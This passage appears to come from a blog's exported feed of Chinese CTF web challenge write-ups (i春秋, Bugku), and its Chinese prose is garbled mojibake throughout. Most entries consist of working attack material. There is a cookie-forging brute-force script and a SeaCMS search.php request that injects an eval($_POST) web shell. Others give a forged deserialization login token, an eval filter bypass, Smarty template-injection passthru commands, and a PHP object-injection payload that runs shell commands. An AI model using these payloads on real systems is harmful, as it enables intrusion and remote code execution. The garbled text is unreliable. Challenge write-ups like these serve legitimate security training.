return $tmp1;}$username = decrypt($_COOKIE['user'],$key);if ($username == 'system'){    echo $flag;}else{    setcookie('user',encrypt('guest',$key));    echo "Ã¢Â•Â®(Ã¢Â•Â¯Ã¢Â–Â½Ã¢Â•Â°)Ã¢Â•Â­";}?&gt;</code></pre><p>åˆ«äººå†™çš„è„šæœ¬ï¼š</p><pre><code># _*_ coding: utf-8 _*from base64 import *import requestsimport string#è®¾ç½®URLurl = "http://ce4d7cd87bd0400eae49ec2fa094677525d7825dd2e64350.changame.ichunqiu.com/fl3g_ichuqiu.php"cookie = requests.get(url).cookies['user']            #è¯·æ±‚è¯¥URLï¼ŒèŽ·å–userçš„COOKIEå€¼txt = b64decode(cookie)                                #å°†å¾—åˆ°çš„cookieè¿›è¡Œbase64è§£ç rnd = txt[:4]                                         #å¯†æ–‡å‰å››ä½æ˜¯éšæœºå­—ç¬¦tmp = txt[4:]                                        #guestä¸Žkeyè¿›è¡Œå¼‚æˆ–çš„å¯†æ–‡ï¼Œ5ä½key = list('123456')                                #keyä¸º6ä½çš„å­—ç¬¦ï¼Œç›®å‰ä¸çŸ¥æ˜¯å•¥guest = list('guest')                                #guestæ˜Žæ–‡system = list('system')                                    for i in range(0,len(guest)):    guest[i] = chr(ord(guest[i]) + 10)                #ä¸ºåŠ å¯†åšå‡†å¤‡for i in range(0,len(guest)):    key[i] = chr(ord(tmp[i]) ^ ord(guest[i]))        #å¾—åˆ°keyçš„å‰äº”ä½for i in range(0,len(system)):    system[i] = chr(ord(system[i]) + 10)            #åŒæ ·æ˜¯ä¸ºäº†åŠ å¯†åšå‡†å¤‡#å‡†å¤‡çˆ†ç ´keyçš„ç¬¬6ä½s = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz"tmp_news = ''                                        #systemä¸Žkeyçš„å¼‚æˆ–å€¼cookie_system = []xstr = ""for ch in s:    key[5] = ch    for i in range(0,len(system)):        tmp_news += chr(ord(system[i]) ^ ord(key[i]))    xstr = rnd + tmp_news                            #éšæœºå­—ç¬¦ä¸Žå¼‚æˆ–çš„ç»“æžœæ‹¼æŽ¥    cookie_system.append(b64encode(xstr))            #base64åŠ å¯†ï¼Œå¹¶åŠ å…¥åˆ°cookie_systemä¸­    tmp_news = ""#print(cookie_system)for i in cookie_system:    cookie = {'user':i.decode()}                    #è®¾ç½®cookie    res = requests.get(url,cookies = cookie)            if "flag" in res.text:        print res.text </code></pre><p><img src="/2021/04/22/i-chun-qiu-web-code/flag.png" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> iæ˜¥ç§‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iæ˜¥ç§‹:Web-test</title>
      <link href="2021/04/21/i-chun-qiu-web-test/"/>
      <url>2021/04/21/i-chun-qiu-web-test/</url>
      
        <content type="html"><![CDATA[<p>æŸ¥äº†ä¸€ä¸‹æµ·æ´‹cms</p><p><img src="/2021/04/21/i-chun-qiu-web-test/blog/source_posts\iæ˜¥ç§‹ï¼šWeb-test\æµ·æ´‹cms.png" alt="æµ·æ´‹cms"></p><pre><code>http://4dbe057d8a0f42c19f0fabcb5693ed57d06b1c6f66c641a3.changame.ichunqiu.com/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[1])</code></pre><p>èšå‰‘è¿žæŽ¥ï¼š</p><p><img src="/2021/04/21/i-chun-qiu-web-test/blog/source_posts\iæ˜¥ç§‹ï¼šWeb-test\å¯†ç .png" alt="å¯†ç "></p><p>åˆ›å»ºæ•°æ®åº“</p><p><img src="/2021/04/21/i-chun-qiu-web-test/blog/source_posts\iæ˜¥ç§‹ï¼šWeb-test\flag.png" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> iæ˜¥ç§‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iæ˜¥ç§‹:Web-login</title>
      <link href="2021/04/20/i-chun-qiu-web-login/"/>
      <url>2021/04/20/i-chun-qiu-web-login/</url>
      
        <content type="html"><![CDATA[<p>åœ¨æŸ¥çœ‹ä¸­æºç çš„æœ€ä¸‹é¢å‘çŽ°äº† test1 test1</p><p>æ€€ç–‘æ˜¯è´¦å· å¯†ç  </p><p>æµ‹è¯•ä¸€ä¸‹æžœç„¶æ²¡é”™</p><p>è¿›å…¥member.php é¡µé¢ ä½†æ˜¯æ²¡ç”¨å‘çŽ°å¯ç”¨ä¿¡æ¯</p><pre><code>(â•¯â€µâ–¡â€²)â•¯ï¸µâ”´â”€â”´</code></pre><p>äºŽæ˜¯burp suiteæ‹¦æˆªåŒ…çœ‹ä¸€ä¸‹</p><p>æ·»åŠ showï¼š1</p><pre><code>&lt;!-- &lt;?php include 'common.php'; $requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE); class db {  public $where;  function __wakeup()  {   if(!empty($this-&gt;where))   {    $this-&gt;select($this-&gt;where);   }  }  function select($where)  {   $sql = mysql_query('select * from user where '.$where);   return @mysql_fetch_array($sql);  } } if(isset($requset['token'])) {  $login = unserialize(gzuncompress(base64_decode($requset['token'])));  $db = new db();  $row = $db-&gt;select('user=\''.mysql_real_escape_string($login['user']).'\'');  if($login['user'] === 'ichunqiu')  {   echo $flag;  }else if($row['pass'] !== $login['pass']){   echo 'unserialize injection!!';  }else{   echo "(â•¯â€µâ–¡â€²)â•¯ï¸µâ”´â”€â”´ ";  } }else{  header('Location: index.php?error=1'); }?&gt; --&gt;</code></pre><p>å¾—çŸ¥è¦å¾—åˆ°flagéœ€è¦æ»¡è¶³ $login[â€˜userâ€™] === â€˜ichunqiuâ€™</p><p>è€Œuserè¢«$login = unserialize(gzuncompress(base64_decode($requset[â€˜tokenâ€™])));å¤„ç†è¿‡</p><p>æˆ‘ä»¬é‡æ–°ç¼–å†™ä¸€ä¸ªç¨‹åºè§£å¯†å³å¯</p><pre><code>&lt;?php $a = array('user'=&gt;'ichunqiu');$b = base64_encode(gzcompress(serialize($a)));echo $b?&gt;</code></pre><p>è¾“å‡ºï¼š</p><pre><code>eJxLtDK0qi62MrFSKi1OLVKyLraysFLKTM4ozSvMLFWyrgUAo4oKXA==</code></pre><p>ä¿®æ”¹token</p><p><img src="/2021/04/20/i-chun-qiu-web-login/blog/source_posts\iæ˜¥ç§‹ï¼šWeb-login\3c9e1d6c3c46d0dac26acdcbb2bb2e3.png" alt="3c9e1d6c3c46d0dac26acdcbb2bb2e3"></p>]]></content>
      
      
      
        <tags>
            
            <tag> iæ˜¥ç§‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iæ˜¥ç§‹:Web-whoareyou</title>
      <link href="2021/04/19/i-chun-qiu-web-whoareyou/"/>
      <url>2021/04/19/i-chun-qiu-web-whoareyou/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/04/19/i-chun-qiu-web-whoareyou/blog/source_posts\iæ˜¥ç§‹ï¼šWeb-whoareyou\è®¿é—®.png" alt="è®¿é—®"></p><p>å¯èƒ½æœ‰ä»¥ä¸‹å‡ ç§å¯èƒ½ï¼š</p><p>â€‹    1ã€æ•æ„Ÿæ–‡ä»¶æ³„æ¼</p><p>â€‹    2ã€è·³è½¬</p><p>â€‹    3ã€cookie / session</p><p>è®¿é—®cookieï¼š</p><p><img src="/2021/04/19/i-chun-qiu-web-whoareyou/blog/source_posts\iæ˜¥ç§‹ï¼šWeb-whoareyou\cookie.png" alt="cookie"></p><p>base64è§£ç </p><pre><code>f:5:"thrfg";</code></pre><p>rot13è§£ç ä¸ºguestï¼ˆ<a href="http://www.mxcz.net/tools/rot13.aspx%EF%BC%89">http://www.mxcz.net/tools/rot13.aspxï¼‰</a></p><p><img src="/2021/04/19/i-chun-qiu-web-whoareyou/blog/source_posts\iæ˜¥ç§‹ï¼šWeb-whoareyou\rot13.png" alt="rot13"></p><pre><code>f:5:"nqzva";</code></pre><p>base64åŠ å¯†</p><pre><code>Zjo1OiJucXp2YSI7</code></pre><p><img src="/2021/04/19/i-chun-qiu-web-whoareyou/blog/source_posts\iæ˜¥ç§‹ï¼šWeb-whoareyou\æŠ“åŒ….png" alt="æŠ“åŒ…"></p><p><img src="/2021/04/19/i-chun-qiu-web-whoareyou/blog/source_posts\iæ˜¥ç§‹ï¼šWeb-whoareyou\ä¿®æ”¹.png" alt="æŠ“åŒ…"></p><pre><code>filename=1.php&amp;data[]=&lt;?php phpinfo();?&gt;</code></pre><p><img src="/2021/04/19/i-chun-qiu-web-whoareyou/blog/source_posts\iæ˜¥ç§‹ï¼šWeb-whoareyou\flag.png" alt="flag"></p><p>ä½†æ˜¯è®¿é—®ä¸äº†</p><p><img src="/2021/04/19/i-chun-qiu-web-whoareyou/a70948c7d864405f8cf59fb32855ae3.png" alt="a70948c7d864405f8cf59fb32855ae3"></p><p>æ²¡åŠžæ³•</p>]]></content>
      
      
      
        <tags>
            
            <tag> iæ˜¥ç§‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web-å†¬è‡³çº¢åŒ…</title>
      <link href="2021/04/18/bugku-web-dong-zhi-hong-bao/"/>
      <url>2021/04/18/bugku-web-dong-zhi-hong-bao/</url>
      
        <content type="html"><![CDATA[<pre><code>&lt;?php    error_reporting(0);    require __DIR__.'/flag.php';    $exam = 'return\''.sha1(time()).'\';';    if (!isset($_GET['flag'])) {        echo '&lt;a href="./?flag='.$exam.'"&gt;Click here&lt;/a&gt;';    }    else if (strlen($_GET['flag']) != strlen($exam)) {        echo 'é•¿åº¦ä¸å…è®¸';    }    else if (preg_match('/`|"|\.|\\\\|\(|\)|\[|\]|_|flag|echo|print|require|include|die|exit/is', $_GET['flag'])) {        echo 'å…³é”®å­—ä¸å…è®¸';    }    else if (eval($_GET['flag']) === sha1($flag)) {        echo $flag;    }    else {        echo 'é©¬è€å¸ˆå‘ç”Ÿç”šä¹ˆäº‹äº†';    }    echo '&lt;hr&gt;';    highlight_file(__FILE__);</code></pre><pre><code>?flag=$a='fla*';$a{3}='g';?&gt;11111111111111111;&lt;?=$$a;?&gt;</code></pre><p>å¾—åˆ°flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web-äºŒæ‰‹äº¤æ˜“å¸‚åœº</title>
      <link href="2021/04/17/bugku-web-er-shou-jiao-yi-shi-chang/"/>
      <url>2021/04/17/bugku-web-er-shou-jiao-yi-shi-chang/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/04/17/bugku-web-er-shou-jiao-yi-shi-chang/blog/source_posts\Bugkuï¼šWeb-äºŒæ‰‹äº¤æ˜“å¸‚åœº\ä¸»é¡µ.png" alt="ä¸»é¡µ"></p><p>å‘çŽ°è¦ç™»å½•æ‰èƒ½</p><p><img src="/2021/04/17/bugku-web-er-shou-jiao-yi-shi-chang/blog/source_posts\Bugkuï¼šWeb-äºŒæ‰‹äº¤æ˜“å¸‚åœº\ä¸Šä¼ .png" alt="ä¸Šä¼ "></p><p>å‘çŽ°æ–‡ä»¶ä¸Šä¼ æ¼æ´žï¼š</p><p>æŠ“åŒ…ä¿®æ”¹å‚æ•°</p><p>![response](D:\blog\source_posts\Bugkuï¼šWeb-äºŒæ‰‹äº¤æ˜“å¸‚åœº\response.pn</p><p><img src="/2021/04/17/bugku-web-er-shou-jiao-yi-shi-chang/blog/source_posts\Bugkuï¼šWeb-äºŒæ‰‹äº¤æ˜“å¸‚åœº\ç¼–ç .png" alt="ç¼–ç "></p><p><img src="/2021/04/17/bugku-web-er-shou-jiao-yi-shi-chang/blog/source_posts\Bugkuï¼šWeb-äºŒæ‰‹äº¤æ˜“å¸‚åœº\response.png" alt="response"></p><p>åŽ»æŽ‰â€œ\â€å’Œuserèšå‰‘è¿žæŽ¥å¾—åˆ°flagï¼š</p><p><img src="/2021/04/17/bugku-web-er-shou-jiao-yi-shi-chang/blog/source_posts\Bugkuï¼šWeb-äºŒæ‰‹äº¤æ˜“å¸‚åœº\flag.png" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:web-regex</title>
      <link href="2021/04/16/bugku-web-regex/"/>
      <url>2021/04/16/bugku-web-regex/</url>
      
        <content type="html"><![CDATA[<pre><code>&lt;?php error_reporting(0);$zero=$_REQUEST['zero'];$first=$_REQUEST['first']; $second=$zero.$first; if(preg_match_all("/Yeedo|wants|a|girl|friend|or|a|flag/i",$second)){                $key=$second;      if(preg_match("/\.\.|flag/",$key)){           die("Noooood hacker!");      }else{            $third=$first;            if(preg_match("/\\|\056\160\150\x70/i",$third)){                   $end=substr($third,5);                   highlight_file(base64_decode($zero).$end);//maybe flag in flag.php             }        }  } else{  highlight_file(__FILE__); } </code></pre><p><img src="/2021/04/16/bugku-web-regex/blog/source_posts\Bugkuï¼šweb-regex\regex1.png" alt="regex1"></p><p><img src="/2021/04/16/bugku-web-regex/blog/source_posts\Bugkuï¼šweb-regex\regex2.png" alt="regex2"></p><p><img src="/2021/04/16/bugku-web-regex/blog/source_posts\Bugkuï¼šweb-regex\flag.png" alt="flag"></p><p><img src="/2021/04/16/bugku-web-regex/blog/source_posts\Bugkuï¼šweb-regex\regex1.png" alt="regex1"></p><p>æˆ‘çŽ°åœ¨å°±ç›´æŽ¥è§£é‡Šä¸‹å½“æ—¶æž„é€ payloadçš„æ€è·¯çš„ï¼š<br>secondeé‡Œè¦å­˜åœ¨â€/Yeedo|wants|a|girl|friend|or|a|flag/iâ€ï¼Œè€Œsecond=zero.firstï¼Œæ‰€ä»¥zero=flag</p><p>key=second=zero.firstï¼Œå¹¶ä¸”ä¸èƒ½å­˜åœ¨â€/..|flag/â€œï¼Œä¹Ÿå°±æ˜¯è¯´zeroä¸èƒ½=flagï¼Œä½†å¯ä»¥çœ‹ä¸‹é¢highlight_file(base64_decode($zero).$end)ï¼Œä¼šè¿›è¡Œbase64_decodeï¼Œæ‰€ä»¥ç›´æŽ¥å°†â€™flagâ€™è¿›è¡Œbase64åŠ å¯†å¾—åˆ°ZmxhZw==</p><p>ä¹‹åŽthird=firstï¼Œå¹¶ä¸”è¦åŒ¹é…â€/\|\056\160\150\x70/iâ€ï¼Œè¿™æ˜¯16è¿›åˆ¶ä¸Žè¿›åˆ¶çš„ä¸œè¥¿ï¼Œè½¬æ¢æˆ10è¿›åˆ¶ï¼Œå†è½¬æˆasciiç åŽå³ä¸º|.phpï¼Œä½†$end=substr($third,5);ï¼Œæ•…éœ€è¦åœ¨|.phpå‰é¢åŠ ä¸Š4ä¸ªå­—ç¬¦ï¼Œæ¥ç»•è¿‡substrï¼Œä¸è¿‡è¿™4ä¸ªå­—ç¬¦å¾—éƒ½æ˜¯â€/Yeedo|wants|a|girl|friend|or|a|flag/iâ€ï¼Œè¿™é‡Œé¢çš„ï¼ˆæˆ‘è¿™é‡Œç»™å‡ºä¸€äº›å­—ç¬¦:aaaa oror Flag girl ï¼‰è¿™é‡Œç”¨Flagçš„åŽŸå› æ˜¯ä¸èƒ½åŒ¹é…/..|flag/ï¼Œæ‰€ä»¥å®Œæ•´çš„payloadä¸ºï¼š</p><pre><code>?zero=ZmxhZw==&amp;first=aaaa|.php</code></pre><p><img src="/2021/04/16/bugku-web-regex/blog/source_posts\Bugkuï¼šweb-regex\flag.png" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web-èªæ˜Žçš„PHP</title>
      <link href="2021/04/16/bugku-web-cong-ming-de-php/"/>
      <url>2021/04/16/bugku-web-cong-ming-de-php/</url>
      
        <content type="html"><![CDATA[<p>æ¨¡æ¿æ³¨å…¥å¯ä»¥çœ‹è¿™é‡Œï¼š</p><p><a href="https://zhuanlan.zhihu.com/p/28823933">https://zhuanlan.zhihu.com/p/28823933</a></p><p><img src="/2021/04/16/bugku-web-cong-ming-de-php/blog/source_posts\Bugkuï¼šWeb-èªæ˜Žçš„PHP\1.png" alt="1"></p><p>ä¼ å‚è¯•è¯•ï¼š</p><p><img src="/2021/04/16/bugku-web-cong-ming-de-php/blog/source_posts\Bugkuï¼šWeb-èªæ˜Žçš„PHP\ä¼ å‚.png" alt="ä¼ å‚"></p><p>å®¡è®¡ä»£ç å¯ä»¥å‘çŽ°ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªsmartyæ¨¡æ¿æ³¨å…¥</p><pre><code>{{2*2}}</code></pre><p><img src="/2021/04/16/bugku-web-cong-ming-de-php/blog/source_posts\Bugkuï¼šWeb-èªæ˜Žçš„PHP22.png" alt="22"></p><p>å› ä¸ºä¸Šä¼ çš„æ—¶å€™ä¼šè¢«è¿‡æ»¤æ‰€ä»¥åŠ äº†ä¸ªâ€œ1â€</p><p>çœ‹åˆ°æ‰§è¡Œäº†<br> å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´žï¼Œè¿‡æ»¤äº†ä¸å°‘å‡½æ•°ï¼Œä½†çœ‹äº†ä¸€ä¸‹ï¼Œ1passthruæ²¡æœ‰è¢«è¿‡æ»¤ è¿™ä¸ªå‡½æ•°å¯ä»¥ä»£æ›¿system()</p><p>è¿™æ—¶å¯ä»¥ç”¨1passthruç›¸å…³çš„è¯­å¥æ¥æž„é€ payloadï¼š<br>æˆ‘é¦–å…ˆæ˜¯å…ˆè¯•äº†ä¸€ä¸‹</p><pre><code>{{1passthru('tac /fl*')}}</code></pre><p>ï¼Œå‘çŽ°æ²¡ä»€ä¹ˆä½œç”¨ï¼ŒæŽ¥ç€è¯•äº†</p><pre><code>{{1passthru('more /fl*')}}</code></pre><p>ï¼ŒåŒæ ·æ²¡æœ‰æ•ˆæžœï¼ŒæŽ¥ç€åˆè¯•äº†</p><pre><code>{{1passthru('/?[a][t] /fl*')}}</code></pre><p>ï¼Œè¿˜æ˜¯ä¸è¡Œï¼Œè¿™æ—¶å·¦æƒ³å³æƒ³ï¼Œçªç„¶æƒ³åˆ°é¢˜ç›®çš„</p><pre><code>maybe the flag fileâ€™s filename is random</code></pre><p><img src="/2021/04/16/bugku-web-cong-ming-de-php/blog/source_posts\Bugkuï¼šWeb-èªæ˜Žçš„PHP\flag.png" alt="flag"></p><p>é™¤äº†ç”¨moreï¼Œè¿˜å¯ä»¥ç”¨lessï¼Œheadï¼Œtailï¼Œnlï¼Œvim</p>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web-å®‰æ…°å¥–</title>
      <link href="2021/04/15/bugku-web-an-wei-jiang/"/>
      <url>2021/04/15/bugku-web-an-wei-jiang/</url>
      
        <content type="html"><![CDATA[<p>æºä»£ç ä¸­å‘çŽ°<img src="/2021/04/15/bugku-web-an-wei-jiang/blog/source_posts\Bugkuï¼šWeb-å®‰æ…°å¥–\é‡å‘½å.png" alt="é‡å‘½å"></p><p>æ‰“å¼€index.php.bak</p><pre><code>&lt;?phpheader("Content-Type: text/html;charset=utf-8");error_reporting(0);echo "&lt;!-- YmFja3Vwcw== --&gt;";class ctf{    protected $username = 'hack';    protected $cmd = 'NULL';    public function __construct($username,$cmd)    {        $this-&gt;username = $username;        $this-&gt;cmd = $cmd;    }    function __wakeup()    {        $this-&gt;username = 'guest';    }    function __destruct()    {        if(preg_match("/cat|more|tail|less|head|curl|nc|strings|sort|echo/i", $this-&gt;cmd))        {            exit('&lt;/br&gt;flagèƒ½è®©ä½ è¿™ä¹ˆå®¹æ˜“æ‹¿åˆ°å—ï¼Ÿ&lt;br&gt;');        }        if ($this-&gt;username === 'admin')        {           // echo "&lt;br&gt;right!&lt;br&gt;";            $a = `$this-&gt;cmd`;            var_dump($a);        }else        {            echo "&lt;/br&gt;ç»™ä½ ä¸ªå®‰æ…°å¥–å§ï¼Œhhhï¼&lt;/br&gt;";            die();        }    }}    $select = $_GET['code'];    $res=unserialize(@$select);?&gt;</code></pre><p>åºåˆ—åŒ–ä»£ç ï¼š</p><pre><code>&lt;?phpclass ctf{    protected $username = 'admin';    protected $cmd = 'tac flag.php';}$a=new ctf();echo(urlencode(serialize($a)));?&gt;</code></pre><p><img src="/2021/04/15/bugku-web-an-wei-jiang/blog/source_posts\Bugkuï¼šWeb-å®‰æ…°å¥–\tac.png" alt="tac"></p><p>protectedå±žæ€§è¢«åºåˆ—åŒ–çš„æ—¶å€™å±žæ€§å€¼ä¼šå˜æˆï¼š%00*%00å±žæ€§å<br> è€Œ%00æ˜¯ç©ºå­—ç¬¦ï¼Œåœ¨æµè§ˆå™¨ä¸­ä¼šæ˜¾ç¤ºä¸ºç©ºï¼Œä½†ä¸ä»£è¡¨ä¼ å…¥æ—¶èƒ½æ²¡æœ‰%00ï¼Œæ‰€ä»¥æˆ‘ä»¬æœ€åŽçš„payloadåº”è¯¥åŠ ä¸Š%00</p><h4 id="ç»•è¿‡wake-upå‡½æ•°"><a href="#ç»•è¿‡wake-upå‡½æ•°" class="headerlink" title="ç»•è¿‡wake upå‡½æ•°"></a>ç»•è¿‡wake upå‡½æ•°</h4><pre><code>?code=O:3:%22ctf%22:3:{s:11:%22%00*%00username%22;s:5:%22admin%22;s:6:%22%00*%00cmd%22;s:12:%22tac%20flag.php%22;}</code></pre><p><img src="/2021/04/15/bugku-web-an-wei-jiang/blog/source_posts\Bugkuï¼šWeb-å®‰æ…°å¥–\flag.png" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web40-gitæ³„éœ²</title>
      <link href="2021/04/14/bugku-web40-git-xie-lu/"/>
      <url>2021/04/14/bugku-web40-git-xie-lu/</url>
      
        <content type="html"><![CDATA[<h2 id="gitä¿¡æ¯æ³„éœ²æ¼æ´ž"><a href="#gitä¿¡æ¯æ³„éœ²æ¼æ´ž" class="headerlink" title="gitä¿¡æ¯æ³„éœ²æ¼æ´ž"></a>gitä¿¡æ¯æ³„éœ²æ¼æ´ž</h2><p>å½“å‰å¤§é‡å¼€å‘äººå‘˜ä½¿ç”¨gitè¿›è¡Œç‰ˆæœ¬æŽ§åˆ¶ï¼Œå¯¹ç«™ç‚¹è‡ªåŠ¨éƒ¨ç½²ã€‚å¦‚æžœé…ç½®ä¸å½“ï¼Œå¯èƒ½ä¼šå°†.gitæ–‡ä»¶å¤¹ç›´æŽ¥éƒ¨ç½²åˆ°çº¿ä¸ŠçŽ¯å¢ƒã€‚è¿™å°±å¼•èµ·äº†gitæ³„éœ²æ¼æ´žã€‚</p><h3 id="å±å®³"><a href="#å±å®³" class="headerlink" title="å±å®³"></a>å±å®³</h3><p>æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´žä¸‹è½½gitæ–‡ä»¶å¤¹é‡Œçš„æ‰€æœ‰å†…å®¹ã€‚å¦‚æžœæ–‡ä»¶å¤¹å†…æœ‰æ•æ„Ÿä¿¡æ¯æ¯”å¦‚ç«™ç‚¹æºç ã€æ•°æ®åº“è´¦æˆ·å¯†ç ç­‰ï¼Œæ”»å‡»è€…å¯èƒ½ç›´æŽ¥æŽ§åˆ¶æœåŠ¡å™¨ã€‚</p><h3 id="Gitä»‹ç»"><a href="#Gitä»‹ç»" class="headerlink" title="Gitä»‹ç»"></a>Gitä»‹ç»</h3><p>Gitä½œä¸ºå¤§å®¶ç†Ÿæ‚‰çš„ï¼Œæ·±å—æ¬¢è¿Žçš„ç‰ˆæœ¬æŽ§åˆ¶å·¥å…·ï¼Œå’Œå…¶ä»–åŒç±»å·¥å…·æœ‰å¾ˆå¤šä¸åŒä¹‹å¤„ï¼š</p><ul><li>Gitå§‹ç»ˆä¿å­˜å¿«ç…§è€Œä¸æ˜¯æ–‡ä»¶å·®å¼‚ã€‚</li><li>ä»»ä½•æ•°æ®å­˜å‚¨å‰å§‹ç»ˆä½¿ç”¨SHA-1è®¡ç®—æ ¡éªŒå’Œï¼Œä¿è¯å†…å®¹å®Œæ•´æ€§ã€‚</li><li>ä½¿ç”¨åˆ†å¸ƒå¼ä»“åº“è®¾è®¡ï¼Œè®©å¤§å¤šæ•°æ“ä½œéƒ½åœ¨æœ¬åœ°è¿›è¡Œï¼Œä¿è¯äº†ä½¿ç”¨æ•ˆçŽ‡ã€‚å‡ ä¹Žæ‰€æœ‰æ“ä½œéƒ½æ˜¯å‘æ•°æ®åº“å¢žåŠ æ•°æ®ï¼Œæäº¤ä¹‹åŽå°±å¾ˆéš¾ä¸¢å¤±æ•°æ®ã€‚å®ƒçš„æœ¬è´¨æ›´åƒä¸€ä¸ªå†…å®¹å¯»å€ï¼ˆcontent-addressableï¼‰æ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶åœ¨æ­¤ä¹‹ä¸Šæä¾›äº†ä¸€ä¸ªç‰ˆæœ¬æŽ§åˆ¶ç³»ç»Ÿçš„ç”¨æˆ·ç•Œé¢ã€‚</li></ul><p>Git æœ‰ä¸‰ç§çŠ¶æ€ï¼Œä½ çš„æ–‡ä»¶å¯èƒ½å¤„äºŽå…¶ä¸­ä¹‹ä¸€ï¼šå·²ä¿®æ”¹ï¼ˆmodifiedï¼‰ã€å·²æš‚å­˜ï¼ˆstagedï¼‰ã€å·²æäº¤ï¼ˆcommittedï¼‰ã€‚ç”±æ­¤å¼•å‡ºä¸‰ä¸ªé€»è¾‘åŒºåŸŸï¼Œä»–ä»¬å’Œæ–‡ä»¶çŠ¶æ€ä»¥åŠéƒ¨åˆ†å¯¹åº”æ“ä½œçš„å…³ç³»å¦‚ä¸‹å›¾ã€‚<br><img src="/2021/04/14/bugku-web40-git-xie-lu/blog/source_posts\Bugkuï¼šWeb40-gitæ³„éœ²\gitä»‹ç».png" alt="gitä»‹ç»"></p><p>Gitå¯¹è±¡<br>åœ¨Gitç³»ç»Ÿä¸­æœ‰å››ä¸­ç±»åž‹çš„å¯¹è±¡ï¼Œæ‰€æœ‰çš„Gitæ“ä½œéƒ½æ˜¯åŸºäºŽè¿™å››ç§ç±»åž‹çš„å¯¹è±¡ã€‚</p><ul><li><p>â€œblobâ€ï¼Œè¿™ç§å¯¹è±¡ç”¨æ¥ä¿å­˜æ–‡ä»¶çš„å†…å®¹ã€‚</p></li><li><p>â€œtreeâ€ï¼Œå¯ä»¥ç†è§£æˆä¸€ä¸ªå¯¹è±¡å…³ç³»æ ‘ï¼Œå®ƒç®¡ç†ä¸€äº›â€treeâ€å’Œâ€œblobâ€å¯¹è±¡ã€‚</p></li><li><p>â€œcommitâ€ï¼ŒæŒ‡å‘ä¸€ä¸ªâ€treeâ€ï¼Œå®ƒç”¨æ¥æ ‡è®°é¡¹ç›®æŸä¸€ä¸ªç‰¹å®šæ—¶é—´ç‚¹çš„çŠ¶æ€ã€‚å®ƒåŒ…æ‹¬ä»¥ä¸‹å…³äºŽæ—¶é—´ç‚¹çš„å…ƒæ•°æ®ï¼Œå¦‚æ—¶é—´æˆ³ã€æœ€è¿‘ä¸€æ¬¡æäº¤çš„ä½œè€…ã€æŒ‡å‘ä¸Šæ¬¡æäº¤ã€</p></li><li><p>â€œtagâ€ï¼Œç»™æŸä¸ªæäº¤å¢žæ·»ä¸€ä¸ªæ ‡è®°ã€‚</p><p>gitå¯¹è±¡ä¹‹é—´çš„ä¸ªå…³ç³»å¦‚ä¸‹å›¾</p><p><img src="/2021/04/14/bugku-web40-git-xie-lu/blog/source_posts\Bugkuï¼šWeb40-gitæ³„éœ²\Gitå¯¹è±¡.png" alt="Gitå¯¹è±¡"></p></li></ul><h4 id="SHA1å“ˆå¸Œå€¼"><a href="#SHA1å“ˆå¸Œå€¼" class="headerlink" title="SHA1å“ˆå¸Œå€¼"></a>SHA1å“ˆå¸Œå€¼</h4><p>åœ¨Gitç³»ç»Ÿä¸­ï¼Œæ¯ä¸ªGitå¯¹è±¡éƒ½é€šè¿‡å“ˆå¸Œå€¼æ¥ä»£è¡¨è¿™ä¸ªå¯¹è±¡ã€‚å“ˆå¸Œå€¼æ˜¯é€šè¿‡SHA1ç®—æ³•è®¡ç®—å‡ºæ¥çš„ï¼Œé•¿åº¦ä¸º40ä¸ªå­—ç¬¦ï¼ˆ40-digitï¼‰ã€‚</p><h4 id="gitç›®å½•"><a href="#gitç›®å½•" class="headerlink" title=".gitç›®å½•"></a>.gitç›®å½•</h4><ul><li>config - åŒ…å«ä¸€äº›é…ç½®é€‰é¡¹</li><li>description - ä»“åº“çš„æè¿°ä¿¡æ¯ï¼Œä¸»è¦ç»™gitwebç­‰gitæ‰˜ç®¡ç³»ç»Ÿä½¿ç”¨</li><li>HEAD - æŒ‡å®šå½“å‰åˆ†æ”¯,æ˜ å°„åˆ°refå¼•ç”¨ï¼Œèƒ½å¤Ÿæ‰¾åˆ°ä¸‹ä¸€æ¬¡commitçš„å‰ä¸€æ¬¡å“ˆå¸Œå€¼</li><li>hooks - å­˜æ”¾å¯åœ¨æŸäº›æŒ‡ä»¤å‰åŽè§¦å‘è¿è¡Œçš„é’©å­è„šæœ¬ï¼ˆhook scriptsï¼‰ï¼Œé»˜è®¤åŒ…å«ä¸€äº›è„šæœ¬æ ·ä¾‹</li><li>index - è¿™ä¸ªæ–‡ä»¶å°±æ˜¯æˆ‘ä»¬å‰é¢æåˆ°çš„æš‚å­˜åŒºï¼ˆstageï¼‰ï¼Œæ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶</li><li>info - å­˜æ”¾ä»“åº“çš„ä¿¡æ¯</li><li>objects - 